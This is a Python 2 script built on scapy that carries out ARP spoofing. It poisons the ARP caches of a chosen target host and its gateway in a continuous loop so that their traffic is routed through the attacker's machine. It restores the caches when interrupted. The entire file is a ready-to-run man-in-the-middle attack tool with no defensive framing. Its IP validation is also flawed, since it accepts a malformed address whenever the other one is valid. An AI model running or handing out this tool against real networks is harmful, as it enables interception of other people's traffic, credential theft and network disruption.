import scapy.all as scapy
import time
import sys
import optparse
import re

def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Please enter the IP address of the TARGET MACHINE!")
    parser.add_option("-g", "--gateway", dest="gateway", help="Please enter the IP address of the GATEWAY!")
    (options, arguements) = parser.parse_args()

    if not options.target:
        parser.error("Please enter a target IP Address using -t or --target")
    elif not options.gateway:
        parser.error("Please enter a gateway IP Address using -g or --gateway")
    elif not (re.match("^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$", options.target) or re.match("^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$", options.gateway)):
        parser.error("Please enter the IP address in proper format of a.b.c.d/x")
    else:
        return options

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_pkt_bcast = arp_broadcast/arp_packet
    answer = scapy.srp(arp_pkt_bcast, timeout = 1, verbose = False)[0]
    #print answer[0][1].hwsrc
    return answer[0][1].hwsrc

def spoof (target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_machine = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc = spoof_ip)        #op=2 is used to send 'is-at' packets
    scapy.send(arp_machine, verbose = False)

def end_spoof (target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_restore = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_restore, verbose=False)

def main(target, gateway):

    packet_counter = 0
    try:
        while True:
            spoof(target, gateway)
            spoof(gateway, target)
            packet_counter += 2
            #Python 2.7 dynamic printing
            print "\r Packets Sent: " + str(packet_counter),           #',' makes the print to store the output in a buffer until the proram is exited
                                                                        #\r forces the cursor to print from the beginning which makes it appear as it is printing at the same place rather than overflowing the terminal but '\r' works only with python2.7 and below
            sys.stdout.flush()                                      #this makes the buffer empty as soon as as this command executes
            time.sleep(2)
    except KeyboardInterrupt:
        print "\nCTRL + C Detected..... Resetting ARP in destination!!!!!"
        end_spoof(target, gateway)
        end_spoof(gateway, target)


options = get_options()
main (options.target, options.gateway)